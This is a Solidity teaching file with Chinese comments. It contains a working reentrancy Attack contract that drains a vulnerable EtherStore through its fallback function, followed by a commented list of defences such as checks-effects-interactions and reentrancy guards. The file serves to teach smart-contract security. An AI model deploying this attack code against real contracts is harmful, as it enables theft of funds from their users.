// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;
import "./7_EtherStore.sol"; // 确保路径正确

// Contract（无 receive 函数，定义 payable 的 fallback）
contract Attack {
    EtherStore public etherStore;

    // 初始化 etherStore 变量
    constructor(address _etherStoreAddress) {
        etherStore = EtherStore(_etherStoreAddress);
    }

    function pwnEtherStore() public payable {
        // 攻击需要至少 1 个以太
        require(msg.value >= 1 ether, "Insufficient Ether");
        // 调用 EtherStore 的 depositFunds 函数
        etherStore.depositFunds{value: 1 ether}();
        // 开始攻击
        etherStore.withdrawFunds(1 ether);
    }

    function collectEther() public {
        // 将合约中的余额发送给调用者
        payable(msg.sender).transfer(address(this).balance);
    }

    // fallback 函数 - 攻击的核心逻辑
    fallback() external payable {
        if (address(etherStore).balance >= 1 ether) {
            etherStore.withdrawFunds(1 ether);
        }
    }
}

/**
 *
防止 fallback 重入攻击的防御方案
‌1. 遵循 Checks-Effects-Interactions 模式‌
‌核心逻辑‌：在合约与外部地址交互（如转账）前，‌先更新内部状态变量‌（如扣除余额），确保攻击者无法通过重入修改未更新的状态‌13。
‌示例代码‌：
function withdraw(uint256 amount) public {
    // Checks：检查条件
    require(balance[msg.sender] >= amount, "Insufficient balance");
    
    // Effects：先更新状态
    balance[msg.sender] -= amount;
    
    // Interactions：最后与外部合约交互
    (bool success, ) = msg.sender.call{value: amount}("");
    require(success, "Transfer failed");
}
‌2. 使用互斥锁（Reentrancy Guard）‌
‌核心逻辑‌：通过状态变量（如 locked）锁定函数执行，防止同一函数在未完成前被重复调用‌12。
‌示例代码‌：
contract ReentrancyGuard {
    bool private locked = false;

    modifier nonReentrant() {
        require(!locked, "Reentrancy detected");
        locked = true;
        _;
        locked = false;
    }
}

contract SafeWithdraw is ReentrancyGuard {
    function withdraw(uint256 amount) external nonReentrant {
        // 安全逻辑
    }
}
‌3. 限制 fallback 函数的 Gas‌
‌核心逻辑‌：通过 transfer 或 send 转账时，默认限制 Gas 为 2300，使攻击者无法在 fallback 中执行复杂逻辑（如再次调用合约）。但需注意，此方法在以太坊升级后可能失效，建议优先使用 call 并显式管理 Gas‌57。
‌示例‌：
// 使用 transfer（限制 Gas）
payable(attacker).transfer(amount);
‌4. 避免低层级调用（call）的滥用‌
‌核心逻辑‌：仅在必要时使用 call，并严格检查调用后的返回值。避免在未验证外部合约安全性的情况下触发其 fallback 函数‌38。
‌风险示例‌：
// 危险：未验证外部合约的 call 调用
(bool success, ) = _externalContract.call{value: amount}("");
‌5. 静态调用（STATICCALL）限制‌
‌核心逻辑‌：通过 STATICCALL 禁止被调用合约修改状态，但需编译器支持且适用场景有限（如仅读取数据）‌6。
*/
